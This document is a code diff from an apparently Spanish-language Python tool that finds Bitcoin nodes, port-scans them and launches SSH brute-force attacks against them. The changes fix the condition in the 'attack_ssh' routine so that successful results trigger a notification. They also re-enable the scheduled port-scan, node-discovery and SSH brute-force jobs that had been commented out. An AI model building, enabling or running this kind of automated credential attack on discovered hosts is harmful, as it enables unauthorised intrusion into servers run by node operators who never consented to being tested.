@@ -39,7 +39,7 @@ def cleaner():
                 online_score = online_score +1
                 if network.check_port(address, int(bitcoin_port)):
                     logging.info("| CLEANER | "+address + " continua online ponemos score a "+str(online_score))
-                    database.update_online_score(address, 100)
+                    database.update_online_score(address, online_score)
                 else:
                     online_score = online_score -1
                     logging.info("Nodo apagado o fuera de cobertura pasa un score de "+str(online_score))
@@ -98,8 +98,9 @@ def attack_ssh():
             logging.info("| SSH ATTACK | Comenzando ataque a "+node[0])
             try:
                 result = ssh_bruteforce.is_ssh_open(node[0])
-                if result != False or result != "None":
-                    network.send_notification(result)
+                if result != False: 
+                    if result != "None":
+                        network.send_notification(result)
             except Exception as e:
                 print(e)
                 pass    
@@ -136,13 +137,13 @@ if __name__ == '__main__':
         first_run_job.start()
         logging.info("Primer arranque detectado")
         time.sleep(60)
-    #cleaner_job.start()
+    cleaner_job.start()
     logging.info("Proceso cleaner iniciado")
-    #user_agent_job.start()
+    user_agent_job.start()
     logging.info("Proceso user agent iniciado")
-    #port_scan_job.start()
+    port_scan_job.start()
     logging.info("Proceso scaner puertos iniciado")
-    #get_more_nodes_job.start()
+    get_more_nodes_job.start()
     logging.info("Proceso detectar más nodos iniciado")
-    #ssh_bruteforce_job.start()
+    ssh_bruteforce_job.start()
     logging.info("Proceso ataque ssh iniciado")
